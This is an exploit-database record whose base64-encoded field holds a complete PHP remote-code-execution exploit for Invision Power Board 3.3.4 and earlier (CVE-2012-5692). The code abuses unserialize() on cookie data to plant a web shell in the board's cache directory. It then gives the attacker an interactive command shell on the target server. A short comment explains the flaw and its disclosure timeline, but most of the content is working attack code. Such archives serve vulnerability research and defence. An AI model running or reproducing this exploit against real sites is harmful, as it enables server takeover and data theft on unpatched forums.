{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgSW52aXNpb24gUG93ZXIgQm9hcmQgPD0gMy4zLjQgInVuc2VyaWFsaXplKCkiIFBIUCBDb2RlIEV4ZWN1dGlvbg0KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICANCiAgICBhdXRob3IuLi4uLi4uLi4uLi4uLjogRWdpZGlvIFJvbWFubyBha2EgRWdpWA0KICAgIG1haWwuLi4uLi4uLi4uLi4uLi4uOiBuMGIwZDEzc1thdF1nbWFpbFtkb3RdY29tDQogICAgc29mdHdhcmUgbGluay4uLi4uLi46IGh0dHA6Ly93d3cuaW52aXNpb25wb3dlci5jb20vDQogICAgDQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgfCBUaGlzIHByb29mIG9mIGNvbmNlcHQgY29kZSB3YXMgd3JpdHRlbiBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZSBvbmx5LiAgICB8DQogICAgfCBVc2UgaXQgYXQgeW91ciBvd24gcmlzay4gQXV0aG9yIHdpbGwgYmUgbm90IHJlc3BvbnNpYmxlIGZvciBhbnkgZGFtYWdlLiB8DQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgDQogICAgWy1dIFZ1bG5lcmFibGUgY29kZSBpbiBJUFNDb29raWU6OmdldCgpIG1ldGhvZCBkZWZpbmVkIGluIC9hZG1pbi9zb3VyY2VzL2Jhc2UvY29yZS5waHANCiAgICANCiAgICA0MDE1LiAgICAgICAgc3RhdGljIHB1YmxpYyBmdW5jdGlvbiBnZXQoJG5hbWUpDQogICAgNDAxNi4gICAgICAgIHsNCiAgICA0MDE3LiAgICAgICAgICAgIC8vIENoZWNrIGludGVybmFsIGRhdGEgZmlyc3QNCiAgICA0MDE4LiAgICAgICAgICAgIGlmICggaXNzZXQoIHNlbGY6OiRfY29va2llc1NldFsgJG5hbWUgXSApICkNCiAgICA0MDE5LiAgICAgICAgICAgIHsNCiAgICA0MDIwLiAgICAgICAgICAgICAgICByZXR1cm4gc2VsZjo6JF9jb29raWVzU2V0WyAkbmFtZSBdOw0KICAgIDQwMjEuICAgICAgICAgICAgfQ0KICAgIDQwMjIuICAgICAgICAgICAgZWxzZSBpZiAoIGlzc2V0KCAkX0NPT0tJRVtpcHNSZWdpc3RyeTo6JHNldHRpbmdzWydjb29raWVfaWQnXS4kbmFtZV0gKSApDQogICAgNDAyMy4gICAgICAgICAgICB7DQogICAgNDAyNC4gICAgICAgICAgICAgICAgJF92YWx1ZSA9ICRfQ09PS0lFWyBpcHNSZWdpc3RyeTo6JHNldHRpbmdzWydjb29raWVfaWQnXS4kbmFtZSBdOw0KICAgIDQwMjUuICAgIA0KICAgIDQwMjYuICAgICAgICAgICAgICAgIGlmICggc3Vic3RyKCAkX3ZhbHVlLCAwLCAyICkgPT0gJ2E6JyApDQogICAgNDAyNy4gICAgICAgICAgICAgICAgew0KICAgIDQwMjguICAgICAgICAgICAgICAgICAgICByZXR1cm4gdW5zZXJpYWxpemUoIHN0cmlwc2xhc2hlcyggdXJsZGVjb2RlKCAkX3ZhbHVlICkgKSApOw0KICAgIDQwMjkuICAgICAgICAgICAgICAgIH0NCiAgICANCiAgICBUaGUgdnVsbmVyYWJpbGl0eSBpcyBjYXVzZWQgZHVlIHRvIHRoaXMgbWV0aG9kIHVuc2VyaWFsaXplIHVzZXIgaW5wdXQgcGFzc2VkIHRocm91Z2ggY29va2llcyB3aXRob3V0IGEgcHJvcGVyDQogICAgc2FuaXRpemF0aW9uLiBUaGUgb25seSBvbmUgY2hlY2sgaXMgZG9uZSBhdCBsaW5lIDQwMjYsICB3aGVyZSBpcyBjb250cm9sbGVkIHRoYXQgdGhlIHNlcmlhbGl6ZWQgc3RyaW5nIHN0YXJ0cw0KICAgIHdpdGggJ2E6JywgIGJ1dCB0aGlzIGlzIG5vdCAgc3VmZmljaWVudCB0byBwcmV2ZW50IGEgICJQSFAgT2JqZWN0IEluamVjdGlvbiIgIGJlY2F1c2UgYW4gYXR0YWNrZXIgbWF5IHNlbmQgIGENCiAgICBzZXJpYWxpemVkIHN0cmluZyB3aGljaCByZXByZXNlbnRzIGFuIGFycmF5IG9mIG9iamVjdHMuICBUaGlzIGNhbiBiZSAgZXhwbG9pdGVkIHRvIGV4ZWN1dGUgYXJiaXRyYXJ5IFBIUCBjb2RlDQogICAgdmlhIHRoZSAgIl9fZGVzdHJ1Y3QoKSIgbWV0aG9kIG9mIHRoZSAgImRiTWFpbiIgY2xhc3MsICB3aGljaCBjYWxscyB0aGUgIndyaXRlRGVidWdMb2ciIG1ldGhvZCB0byB3cml0ZSBkZWJ1Zw0KICAgIGluZm8gaW50byBhIGZpbGUuICBQSFAgY29kZSBtYXkgIGJlIGluamVjdGVkICBvbmx5IHRocm91Z2ggdGhlICAkX1NFUlZFUlsnUVVFUllfU1RSSU5HJ10gIHZhcmlhYmxlLCAgZm9yIHRoaXMNCiAgICByZWFzb24gc3VjY2Vzc2Z1bCBleHBsb2l0YXRpb24gb2YgdGhpcyB2dWxuZXJhYmlsaXR5IHJlcXVpcmVzIHNob3J0X29wZW5fdGFnIHRvIGJlIGVuYWJsZWQuDQoNCiAgICBbLV0gRGlzY2xvc3VyZSB0aW1lbGluZToNCiAgICANCiAgICBbMjEvMTAvMjAxMl0gLSBWdWxuZXJhYmlsaXR5IGRpc2NvdmVyZWQNCiAgICBbMjMvMTAvMjAxMl0gLSBWZW5kb3Igbm90aWZpZWQNCiAgICBbMjUvMTAvMjAxMl0gLSBQYXRjaCByZWxlYXNlZDogaHR0cDovL2NvbW11bml0eS5pbnZpc2lvbnBvd2VyLmNvbS90b3BpYy8zNzE2MjUtaXBib2FyZC0zMXgtMzJ4LWFuZC0zM3gtc2VjdXJpdHktdXBkYXRlDQogICAgWzI1LzEwLzIwMTJdIC0gQ1ZFIG51bWJlciByZXF1ZXN0ZWQNCiAgICBbMjkvMTAvMjAxMl0gLSBBc3NpZ25lZCBDVkUtMjAxMi01NjkyDQogICAgWzMxLzEwLzIwMTJdIC0gUHVibGljIGRpc2Nsb3N1cmUNCg0KKi8NCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQppbmlfc2V0KCdkZWZhdWx0X3NvY2tldF90aW1lb3V0JywgNSk7DQoNCmZ1bmN0aW9uIGh0dHBfc2VuZCgkaG9zdCwgJHBhY2tldCkNCnsNCiAgICBpZiAoISgkc29jayA9IGZzb2Nrb3BlbigkaG9zdCwgODApKSkgZGllKCJcblstXSBObyByZXNwb25zZSBmcm9tIHskaG9zdH06ODBcbiIpOw0KICAgIGZwdXRzKCRzb2NrLCAkcGFja2V0KTsNCiAgICByZXR1cm4gc3RyZWFtX2dldF9jb250ZW50cygkc29jayk7DQp9DQoNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIjsNCnByaW50ICJcbnwgSW52aXNpb24gUG93ZXIgQm9hcmQgPD0gMy4zLjQgUmVtb3RlIENvZGUgRXhlY3V0aW9uIEV4cGxvaXQgYnkgRWdpWCB8IjsNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXG4iOw0KDQppZiAoJGFyZ2MgPCAzKQ0Kew0KICAgIHByaW50ICJcblVzYWdlLi4uLi4uOiBwaHAgJGFyZ3ZbMF0gPGhvc3Q+IDxwYXRoPlxuIjsNCiAgICBwcmludCAiXG5FeGFtcGxlLi4uLjogcGhwICRhcmd2WzBdIGxvY2FsaG9zdCAvIjsNCiAgICBwcmludCAiXG5FeGFtcGxlLi4uLjogcGhwICRhcmd2WzBdIGxvY2FsaG9zdCAvaXBiL1xuIjsNCiAgICBkaWUoKTsNCn0NCg0KbGlzdCgkaG9zdCwgJHBhdGgpID0gYXJyYXkoJGFyZ3ZbMV0sICRhcmd2WzJdKTsNCg0KJHBhY2tldCAgPSAiR0VUIHskcGF0aH1pbmRleC5waHAgSFRUUC8xLjBcclxuIjsNCiRwYWNrZXQgLj0gIkhvc3Q6IHskaG9zdH1cclxuIjsNCiRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iOw0KICAgIA0KJF9wcmVmaXggPSBwcmVnX21hdGNoKCcvQ29va2llOiAoLispc2Vzc2lvbi8nLCBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpLCAkbSkgPyAgJG1bMV0gOiAnJzsNCg0KY2xhc3MgZGJfZHJpdmVyX215c3FsDQp7DQogICAgcHVibGljICRvYmogPSBhcnJheSgndXNlX2RlYnVnX2xvZycgPT4gMSwgJ2RlYnVnX2xvZycgPT4gJ2NhY2hlL3NoLnBocCcpOw0KfQ0KDQokcGF5bG9hZCA9IHVybGVuY29kZShzZXJpYWxpemUoYXJyYXkobmV3IGRiX2RyaXZlcl9teXNxbCkpKTsNCiRwaHBjb2RlID0gJzw/ZXJyb3JfcmVwb3J0aW5nKDApO3ByaW50KF9fXyk7cGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUltIVFRQX0NNRF0pKTtkaWU7Pz4nOw0KDQokcGFja2V0ICA9ICJHRVQgeyRwYXRofWluZGV4LnBocD97JHBocGNvZGV9IEhUVFAvMS4wXHJcbiI7DQokcGFja2V0IC49ICJIb3N0OiB7JGhvc3R9XHJcbiI7DQokcGFja2V0IC49ICJDb29raWU6IHskX3ByZWZpeH1tZW1iZXJfaWQ9eyRwYXlsb2FkfVxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiI7DQoNCmh0dHBfc2VuZCgkaG9zdCwgJHBhY2tldCk7DQoNCiRwYWNrZXQgID0gIkdFVCB7JHBhdGh9Y2FjaGUvc2gucGhwIEhUVFAvMS4wXHJcbiI7DQokcGFja2V0IC49ICJIb3N0OiB7JGhvc3R9XHJcbiI7DQokcGFja2V0IC49ICJDbWQ6ICVzXHJcbiI7DQokcGFja2V0IC49ICJDb25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIjsNCg0KaWYgKHByZWdfbWF0Y2goJy88XD9lcnJvci8nLCBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpKSkgZGllKCJcblstXSBzaG9ydF9vcGVuX3RhZyBkaXNhYmxlZCFcbiIpOw0KDQp3aGlsZSgxKQ0Kew0KICAgIHByaW50ICJcbmlwYi1zaGVsbCMgIjsNCiAgICBpZiAoKCRjbWQgPSB0cmltKGZnZXRzKFNURElOKSkpID09ICJleGl0IikgYnJlYWs7DQogICAgJHJlc3BvbnNlID0gaHR0cF9zZW5kKCRob3N0LCBzcHJpbnRmKCRwYWNrZXQsIGJhc2U2NF9lbmNvZGUoJGNtZCkpKTsNCiAgICBwcmVnX21hdGNoKCcvX19fKC4qKS9zJywgJHJlc3BvbnNlLCAkbSkgPyBwcmludCAkbVsxXSA6IGRpZSgiXG5bLV0gRXhwbG9pdCBmYWlsZWQhXG4iKTsNCn0=", 
    "filename": "platforms/php/webapps/22398.php", 
    "id": "22398", 
    "cves": [
        "CVE-2012-5692"
    ]
}